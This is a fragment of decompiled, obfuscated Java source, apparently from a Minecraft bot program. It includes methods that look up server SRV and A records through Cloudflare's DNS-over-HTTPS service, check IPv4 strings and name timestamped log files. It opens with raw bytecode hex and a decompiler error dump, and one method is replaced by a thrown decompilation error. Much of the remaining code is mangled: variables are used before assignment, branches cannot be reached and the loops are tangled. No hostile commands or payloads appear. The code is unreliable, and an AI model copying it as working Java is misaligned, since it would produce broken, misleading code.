07 01 99 07 01 9C 07 01 99 07 00 1D 07 00 1D 01 07 01 CC 01 01 01 07 01 D2 01 01 01 01 01 01 07 00 1D 07 00 1D 01 01 07 00 1D 01 01 01 07 01 D8 07 00 1D 07 00 1D 04 07 00 1D 07 02 3F 07 02 46 01 05 00 01 00 01 07 01 97 00 41 07 00 1D FF 00 23 00 26 07 00 02 07 01 4E 07 01 99 07 01 9C 07 01 99 07 00 1D 07 00 1D 01 07 01 CC 01 01 01 07 01 D2 01 01 01 01 01 01 07 00 1D 07 00 1D 01 01 07 00 1D 01 01 01 07 01 D8 07 00 1D 07 00 1D 04 07 00 1D 07 02 3F 07 02 46 01 07 02 02 00 01 00 01 07 01 97 00 48 07 01 97 06 F7 00 76 07 01 97 40 07 02 02 4B 07 01 97 00 03
        //    Exceptions:
        //  Try           Handler
        //  Start  End    Start  End    Type                 
        //  -----  -----  -----  -----  ---------------------
        //  1135   1143   1146   1147   Ljava/lang/Exception;
        //  1103   1111   1114   1115   Ljava/lang/Exception;
        //  1067   1075   1078   1079   Ljava/lang/Exception;
        //  1031   1039   1042   1043   Ljava/lang/Exception;
        //  996    1004   1007   1008   Ljava/lang/Exception;
        //  964    972    975    976    Ljava/lang/Exception;
        //  926    940    943    944    Ljava/lang/Exception;
        //  908    914    917    918    Ljava/lang/Exception;
        //  893    904    907    908    Ljava/lang/Exception;
        //  826    863    866    867    Ljava/lang/Exception;
        //  819    856    859    860    Ljava/lang/Exception;
        //  814    822    825    826    Ljava/lang/Exception;
        //  782    790    793    794    Ljava/lang/Exception;
        //  750    758    761    762    Ljava/lang/Exception;
        //  715    723    726    727    Ljava/lang/Exception;
        //  680    705    708    709    Ljava/lang/Exception;
        //  675    683    686    687    Ljava/lang/Exception;
        //  643    651    654    655    Ljava/lang/Exception;
        //  611    619    622    623    Ljava/lang/Exception;
        //  569    577    580    581    Ljava/lang/Exception;
        //  533    559    562    563    Ljava/lang/Exception;
        //  528    536    539    540    Ljava/lang/Exception;
        //  496    504    507    508    Ljava/lang/Exception;
        //  467    475    478    479    Ljava/lang/Exception;
        //  429    443    446    447    Ljava/lang/Exception;
        //  241    272    272    273    Ljava/lang/Exception;
        //  222    237    240    241    Ljava/lang/Exception;
        //  216    228    231    232    Ljava/lang/Exception;
        //  158    193    193    194    Ljava/lang/Exception;
        //  142    162    165    166    Ljava/lang/Exception;
        //  135    154    157    158    Ljava/lang/Exception;
        //  130    138    141    142    Ljava/lang/Exception;
        //  85     119    119    120    Ljava/lang/Exception;
        //  72     88     91     92     Ljava/lang/Exception;
        //  33     51     54     55     Ljava/lang/Exception;
        //  1171   1181   1184   1193   Ljava/lang/Exception;
        //  1478   1486   1489   1490   Ljava/lang/Exception;
        //  1441   1455   1458   1459   Ljava/lang/Exception;
        //  1423   1429   1432   1433   Ljava/lang/Exception;
        //  1408   1419   1422   1423   Ljava/lang/Exception;
        //  1385   1393   1396   1397   Ljava/lang/Exception;
        //  1356   1364   1367   1368   Ljava/lang/Exception;
        //  1324   1332   1335   1336   Ljava/lang/Exception;
        //  1292   1300   1303   1304   Ljava/lang/Exception;
        //  1263   1271   1274   1275   Ljava/lang/Exception;
        //  1231   1239   1242   1243   Ljava/lang/Exception;
        //  1199   1207   1210   1211   Ljava/lang/Exception;
        //  1490   1506   1509   1511   Ljava/lang/Exception;
        //  1516   1523   1526   1528   Ljava/lang/Exception;
        //  1536   1552   1555   1556   Ljava/lang/Exception;
        //  1674   1688   1691   1723   Ljava/lang/Exception;
        //  1817   1830   1833   1834   Ljava/lang/Exception;
        //  1781   1791   1794   1795   Ljava/lang/Exception;
        //  1754   1770   1773   1774   Ljava/lang/Exception;
        //  1747   1757   1760   1761   Ljava/lang/Exception;
        //  1834   1840   1843   1850   Ljava/lang/Exception;
        //  1970   1979   1982   1983   Ljava/lang/Exception;
        //  1850   1966   1969   1970   Ljava/lang/Exception;
        // 
        // The error that occurred was:
        // 
        // java.lang.IllegalStateException: Expression is linked from several locations: Label_0142:
        //     at com.strobel.decompiler.ast.Error.expressionLinkedFromMultipleLocations(Error.java:27)
        //     at com.strobel.decompiler.ast.AstOptimizer.mergeDisparateObjectInitializations(AstOptimizer.java:2596)
        //     at com.strobel.decompiler.ast.AstOptimizer.optimize(AstOptimizer.java:235)
        //     at com.strobel.decompiler.ast.AstOptimizer.optimize(AstOptimizer.java:42)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:214)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:99)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethodBody(AstBuilder.java:782)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethod(AstBuilder.java:675)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addTypeMembers(AstBuilder.java:552)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeCore(AstBuilder.java:519)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeNoCache(AstBuilder.java:161)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createType(AstBuilder.java:150)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addType(AstBuilder.java:125)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.buildAst(JavaLanguage.java:71)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.decompileType(JavaLanguage.java:59)
        //     at com.strobel.decompiler.DecompilerDriver.decompileType(DecompilerDriver.java:330)
        //     at com.strobel.decompiler.DecompilerDriver.decompileJar(DecompilerDriver.java:251)
        //     at com.strobel.decompiler.DecompilerDriver.main(DecompilerDriver.java:126)
        // 
        throw new IllegalStateException("An error occurred while decompiling this method.");
    }
    
    private String c() {
        File file3 = null;
    Label_0109_Outer:
        while (true) {
            final boolean j = Bot.j;
            final String format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
            File file = new File(String.valueOf(format) + ".txt");
            int n = 0;
            while (true) {
                while (true) {
                    Label_0110: {
                        try {
                            if (!j) {
                                break Label_0110;
                            }
                            final StringBuilder sb;
                            final File file2 = new File(sb.append("(").append(++n).append(").txt").toString());
                            sb = new StringBuilder(String.valueOf(format));
                        }
                        catch (IllegalArgumentException ex) {
                            throw ex;
                        }
                        file = file3;
                    }
                    if (file.exists()) {
                        continue Label_0109_Outer;
                    }
                    break;
                }
                file3 = file;
                if (!j) {
                    break;
                }
                continue;
            }
        }
        return file3.getName();
    }
    
    public j d() {
        return this.d;
    }
    
    public z e() {
        return this.e;
    }
    
    public i f() {
        return this.g;
    }
    
    public String b(final String str) {
        final boolean j = Bot.j;
        try {
            final URLConnection openConnection = new URL("https://1.1.1.1/dns-query?name=_minecraft._tcp." + str + "&type=SRV").openConnection();
            openConnection.setRequestProperty("Accept", "application/dns-json");
            final ib e = new kb().a(w.a(new InputStreamReader(openConnection.getInputStream()))).e();
            ib e2 = null;
            String s2 = null;
            Label_0100: {
                ib ib;
                String s;
                try {
                    ib = (e2 = e);
                    s = (s2 = "Answer");
                    if (j) {
                        break Label_0100;
                    }
                    final boolean b = ib.a(s);
                    if (b) {
                        break Label_0100;
                    }
                    return "";
                }
                catch (Throwable t) {
                    throw t;
                }
                try {
                    final boolean b = ib.a(s);
                    if (!b) {
                        return "";
                    }
                    e2 = e.b("Answer").f().a(0).e();
                    s2 = "data";
                }
                catch (Throwable t2) {
                    throw t2;
                }
            }
            final String h = e2.b(s2).h();
            String substring = h.split(" ")[3];
            String s3 = null;
            String regex = null;
            Label_0180: {
                try {
                    s3 = substring;
                    regex = ".";
                    if (j) {
                        return String.valueOf(substring) + ":" + s3.split(regex)[2];
                    }
                    if (!s3.endsWith(regex)) {
                        break Label_0180;
                    }
                }
                catch (Throwable t3) {
                    throw t3;
                }
                substring = substring.substring(0, substring.length() - 1);
            }
            return String.valueOf(substring) + ":" + s3.split(regex)[2];
        }
        catch (Throwable t4) {
            return "";
        }
    }
    
    public JScrollPane g() {
        return this.i;
    }
    
    public void a(final JScrollPane i) {
        this.i = i;
    }
    
    public JTextArea h() {
        return this.h;
    }
    
    public void a(final JTextArea h) {
        this.h = h;
    }
    
    public static String c(final String str) {
        final boolean j = Bot.j;
        Label_0027: {
            String s = null;
            Label_0021: {
                try {
                    s = str;
                    if (j) {
                        return s;
                    }
                    final boolean b = d(str);
                    if (b) {
                        break Label_0021;
                    }
                    break Label_0027;
                }
                catch (IllegalArgumentException ex) {
                    throw ex;
                }
                try {
                    final boolean b = d(str);
                    if (!b) {
                        break Label_0027;
                    }
                    s = str;
                }
                catch (IllegalArgumentException ex2) {
                    throw ex2;
                }
            }
            return s;
        }
        final URLConnection openConnection = new URL("https://1.1.1.1/dns-query?name=" + str + "&type=A").openConnection();
        openConnection.setRequestProperty("Accept", "application/dns-json");
        final ib e = new kb().a(w.a(new InputStreamReader(openConnection.getInputStream()))).e();
        ib e2 = null;
        String s3 = null;
        Label_0120: {
            ib ib;
            String s2;
            try {
                ib = (e2 = e);
                s2 = (s3 = "Answer");
                if (j) {
                    return e2.b(s3).h();
                }
                final boolean b2 = ib.a(s2);
                if (b2) {
                    break Label_0120;
                }
                throw new Exception();
            }
            catch (IllegalArgumentException ex3) {
                throw ex3;
            }
            try {
                final boolean b2 = ib.a(s2);
                if (!b2) {
                    throw new Exception();
                }
                e2 = e.b("Answer").f().a(0).e();
                s3 = "data";
            }
            catch (IllegalArgumentException ex4) {
                throw ex4;
            }
        }
        return e2.b(s3).h();
    }
    
    public static boolean d(final String s) {
        final boolean j = Bot.j;
        try {
            String s2 = null;
            Label_0037: {
                Label_0036: {
                    Label_0019: {
                        try {
                            s2 = s;
                            final String s3 = s;
                            if (j) {
                                break Label_0019;
                            }
                            if (s == null) {
                                return false;
                            }
                        }
                        catch (NumberFormatException ex) {
                            throw ex;
                        }
                        s2 = s;
                        final String s3 = s;
                        try {
                            if (j) {
                                break Label_0037;
                            }
                            if (!s3.isEmpty()) {
                                break Label_0036;
                            }
                        }
                        catch (NumberFormatException ex2) {
                            throw ex2;
                        }
                    }
                    return false;
                }
                s2 = s;
            }
            final String[] split = s2.split("\\.");
            while (true) {
                Label_0060: {
                    try {
                        final String[] array2;
                        final String[] array = array2 = split;
                        if (j) {
                            break Label_0061;
                        }
                        if (array.length == 4) {
                            break Label_0060;
                        }
                    }
                    catch (NumberFormatException ex3) {
                        throw ex3;
                    }
                    return false;
                    Block_9: {
                        int int1 = 0;
                    Label_0082_Outer:
                        while (true) {
                            final String[] array;
                            final String[] array3 = array;
                            final String[] array2;
                            final int length = array2.length;
                            int n = 0;
                            while (true) {
                                while (true) {
                                    Label_0125: {
                                        String s4;
                                        try {
                                            if (!j) {
                                                break Label_0125;
                                            }
                                            s4 = array3[n];
                                        }
                                        catch (NumberFormatException ex4) {
                                            throw ex4;
                                        }
                                        final int n2 = int1 = Integer.parseInt(s4);
                                        if (!j) {
                                            Label_0122: {
                                                Label_0110: {
                                                    int n3;
                                                    try {
                                                        if (int1 < 0) {
                                                            break;
                                                        }
                                                        n3 = n2;
                                                        final boolean b = j;
                                                        if (!b) {
                                                            break Label_0110;
                                                        }
                                                        break;
                                                    }
                                                    catch (NumberFormatException ex5) {
                                                        throw ex5;
                                                    }
                                                    try {
                                                        final boolean b = j;
                                                        if (!b) {
                                                            if (n3 <= 255) {
                                                                break Label_0122;
                                                            }
                                                        }
                                                    }
                                                    catch (NumberFormatException ex6) {
                                                        throw ex6;
                                                    }
                                                }
                                                break;
                                            }
                                            ++n;
                                            break Label_0125;
                                            break;
                                        }
                                        break;
                                    }
                                    if (n < length) {
                                        continue Label_0082_Outer;
                                    }
                                    break;
                                }
                                String s4 = s;
                                if (!j) {
                                    break Block_9;
                                }
                                continue;
                            }
                        }
                        return int1 != 0;
                    }
                    boolean endsWith = false;
                    Label_0157: {
                        try {
                            endsWith = s.endsWith(".");
                            if (j) {
                                return endsWith;
                            }
                            if (!endsWith) {
                                break Label_0157;
                            }
                        }
                        catch (NumberFormatException ex7) {
                            throw ex7;
                        }
                        return false;
                    }
                    return endsWith;
                }
                final String[] array4;
                String[] array2 = array4 = split;
                continue;
            }
        }
        catch (NumberFormatException ex8) {
            return false;
        }
    }
}
